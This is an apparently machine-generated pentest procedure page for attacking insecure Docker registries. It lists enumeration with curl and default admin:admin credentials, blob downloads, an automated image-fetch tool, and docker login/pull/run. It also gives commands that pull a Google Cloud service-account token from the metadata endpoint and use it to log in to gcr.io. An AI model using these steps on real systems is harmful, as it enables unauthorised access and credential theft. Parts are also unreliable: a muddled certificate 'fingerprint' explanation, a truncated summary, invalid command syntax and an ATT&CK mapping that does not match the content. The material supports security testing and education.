---
id: e7196063-7f20-4630-9780-60e69f4b68aa
name: Insecure Docker Registry Pentest
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:17.052797+00:00'
updated_at: '2023-04-10T20:33:50.741300+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[Modify Authentication Process|T1556 - Modify Authentication Process]]'
sub_techniques:
- '[[Domain Controller Authentication|T1556.001 - Domain Controller Authentication]]'
- '[[Password Filter DLL|T1556.002 - Password Filter DLL]]'
- '[[Pluggable Authentication Modules|T1556.003 - Pluggable Authentication Modules]]'
tags:
- '[[Container - Docker Pentest]]'
- '[[Insecure Docker Registry]]'
commands:
- '[[Automated download]]'
- '[[Check Docker Distribution API Version]]'
- '[[Docker Login]]'
- '[[Docker Pull]]'
- '[[Docker Run]]'
- '[[Download blobs]]'
- '[[Get Google Cloud service account email]]'
- '[[Get Google Cloud service account token]]'
- '[[List all repositories]]'
- '[[List image blobs]]'
- '[[List image tags]]'
- '[[Login to Google Container Registry]]'
- '[[Pull image]]'
---

# Insecure Docker Registry Pentest

## Summary

Insecure Docker Registries can be a major security risk, allowing attackers to gain access to sensitive information and systems. In this procedure, we will be testing the security of an insecure Docker Registry, identifying vulnerabilities and potential attack vectors. We will use a variety of tech

## Description

# Description

Insecure Docker Registries can be a major security risk, allowing attackers to gain access to sensitive information and systems. In this procedure, we will be testing the security of an insecure Docker Registry, identifying vulnerabilities and potential attack vectors. We will use a variety of techniques to gain access to the Registry, including fingerprinting, listing repositories, and accessing the registry using Google OAuth tokens. By the end of this procedure, we will have a better understanding of the security risks posed by insecure Docker Registries, and be better equipped to secure them in the future.

## Requirements

1. Access to an insecure Docker Registry

1. Docker client installed

1. Google OAuth token (if testing access to a private registry)

## Defense

1. Ensure that Docker Registries are secured with strong authentication and access controls

1. Regularly monitor Docker Registries for unauthorized access and activity

1. Implement network segmentation and isolation to limit the impact of a compromised Docker Registry

## Objectives

1. Identify insecure Docker Registries

1. Enumerate repositories and images in the Registry

1. Gain access to the Registry and start a container

1. Identify potential vulnerabilities and attack vectors

# Instructions

1. To retrieve the Docker Registry’s fingerprint, use the following command:

**Code**: [[Docker-Distribution-Api-Version]]

> The Docker Registry’s fingerprint is a unique identifier for the registry. It is used to verify the authenticity of the registry and ensure that it has not been tampered with. To retrieve the fingerprint, use the following command: 

$ openssl s_client -connect <registry_host>:<registry_port> 

Replace <registry_host> and <registry_port> with the hostname and port number of the Docker Registry. The command will return a lot of output, but the fingerprint can be found in the following section:

Certificate chain
 0 s:/CN=<registry_host>
   i:/CN=<registry_host>
-----BEGIN CERTIFICATE-----
<certificate_data>
-----END CERTIFICATE-----

Copy the certificate data (including the BEGIN and END lines) and save it to a file. Then run the following command to retrieve the fingerprint:

$ openssl x509 -in <certificate_file> -noout -fingerprint

Replace <certificate_file> with the path to the file containing the certificate data. The command will output the fingerprint in the following format:

SHA1 Fingerprint=<fingerprint>

The fingerprint is a 40-character string that uniquely identifies the Docker Registry.

**Command** ([[Check Docker Distribution API Version]]):

```bash
curl -i http://localhost:5000/v2/
```

2. Send a GET request to the endpoint /v2/_catalog using the appropriate authentication header.

**Code**: [[/v2/_catalog]]

> This command will return a list of all repositories available in the registry. The response will be a JSON object containing an array of repository names.

**Command** ([[List all repositories]]):

```bash
/v2/_catalog
```

3. The above commands are used to interact with a Docker registry. The first command 'curl https://registry.example.com/v2/<image_name>/tags/list' is used to list all the tags available for a specific image in the registry. The second command 'docker pull https://registry.example.com:443/<image_name>:<tag>' is used to pull a specific image with a particular tag from the registry. The third command 'curl -s -k --user "admin:admin" https://docker.registry.local/v2/_catalog' is used to list all the images present in the registry. The fourth command 'curl -s -k --user "admin:admin" https://docker.registry.local/v2/wordpress-image/tags/list' is used to list all the tags available for a specific image in the registry. The fifth command 'curl -s -k --user "admin:admin" https://docker.registry.local/v2/wordpress-image/manifests/latest' is used to retrieve the manifest of a specific image in the registry. The sixth command 'curl -s -k --user 'admin:admin' 'http://docker.registry.local/v2/wordpress-image/blobs/sha256:c314c5effb61c9e9c534c81a6970590ef4697b8439ec6bb4ab277833f7315058' > out.tar.gz' is used to download a specific blob of an image from the registry. The last command 'python /opt/docker_fetch/docker_image_fetch.py -u http://admin:admin@docker.registry.local' is used to download all the layers of an image from the registry automatically.

**Code**: [[curl https://registry.example.com/v2/<image_name>/]]

> The first command is used to list all the tags available for a specific image in the registry. The second command is used to pull a specific image with a particular tag from the registry. The third command is used to list all the images present in the registry. The fourth command is used to list all the tags available for a specific image in the registry. The fifth command is used to retrieve the manifest of a specific image in the registry. The sixth command is used to download a specific blob of an image from the registry. The last command is used to download all the layers of an image from the registry automatically.

**Command** ([[List image tags]]):

```bash
curl https://registry.example.com/v2/<image_name>/tags/list
```

**Command** ([[Pull image]]):

```bash
docker pull https://registry.example.com:443/<image_name>:<tag>
```

**Command** ([[List image blobs]]):

```bash
curl -s -k --user "admin:admin" https://docker.registry.local/v2/_catalog
curl -s -k --user "admin:admin" https://docker.registry.local/v2/wordpress-image/tags/list
curl -s -k --user "admin:admin" https://docker.registry.local/v2/wordpress-image/manifests/latest
```

**Command** ([[Download blobs]]):

```bash
curl -s -k --user 'admin:admin' 'http://docker.registry.local/v2/wordpress-image/blobs/sha256:c314c5effb61c9e9c534c81a6970590ef4697b8439ec6bb4ab277833f7315058' > out.tar.gz
```

**Command** ([[Automated download]]):

```bash
https://github.com/NotSoSecure/docker_fetch/
python /opt/docker_fetch/docker_image_fetch.py -u http://admin:admin@docker.registry.local
```

4. To access a private registry, use the `docker login` command followed by the registry URL, username, and password. Once authenticated, you can pull the image from the registry using the `docker pull` command. Finally, use the `docker run` command to start a container with the pulled image.

**Code**: [[docker login -u admin -p admin docker.registry.loc]]

> The `docker login` command is used to authenticate with a private registry. The `-u` option specifies the username and the `-p` option specifies the password. Once authenticated, you can use the `docker pull` command to pull the desired image from the registry. Finally, use the `docker run` command to start a container with the pulled image. The `-it` option is used to start the container in interactive mode and `/bin/bash` specifies the command to run inside the container.

**Command** ([[Docker Login]]):

```bash
docker login -u admin -p admin docker.registry.local
```

**Command** ([[Docker Pull]]):

```bash
docker pull docker.registry.local/wordpress-image
```

**Command** ([[Docker Run]]):

```bash
docker run -it docker.registry.local/wordpress-image /bin/bash
```

5. To access a private registry using OAuth Token from Google, follow these steps:
1. Get the email associated with the default service account by running the command:
   curl http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/email
2. Get the OAuth access token by running the command:
   curl -s http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
3. Use the obtained email and access token to login to the private registry using the command:
   docker login -e <email> -u oauth2accesstoken -p "<access token>" https://gcr.io

**Code**: [[curl http://metadata.google.internal/computeMetada]]

> This command is used to access a private registry using OAuth Token from Google. It involves obtaining the email associated with the default service account, getting the OAuth access token and using these credentials to login to the private registry. The 'curl' command is used to obtain the email and access token, while 'docker login' command is used to login to the private registry. The '-e' option is used to specify the email, '-u' option is used to specify the username and '-p' option is used to specify the password (access token in this case) for authentication.

**Command** ([[Get Google Cloud service account email]]):

```bash
curl http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/email
```

**Command** ([[Get Google Cloud service account token]]):

```bash
curl -s http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```

**Command** ([[Login to Google Container Registry]]):

```bash
docker login -e <service_account_email> -u oauth2accesstoken -p "<service_account_token>" https://gcr.io
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[Modify Authentication Process|T1556 - Modify Authentication Process]]

### Sub-Techniques

- [[Domain Controller Authentication|T1556.001 - Domain Controller Authentication]]
- [[Password Filter DLL|T1556.002 - Password Filter DLL]]
- [[Pluggable Authentication Modules|T1556.003 - Pluggable Authentication Modules]]

## Commands Used

- [[Automated download]]
- [[Check Docker Distribution API Version]]
- [[Docker Login]]
- [[Docker Pull]]
- [[Docker Run]]
- [[Download blobs]]
- [[Get Google Cloud service account email]]
- [[Get Google Cloud service account token]]
- [[List all repositories]]
- [[List image blobs]]
- [[List image tags]]
- [[Login to Google Container Registry]]
- [[Pull image]]

## Tags

- [[Container - Docker Pentest]]
- [[Insecure Docker Registry]]
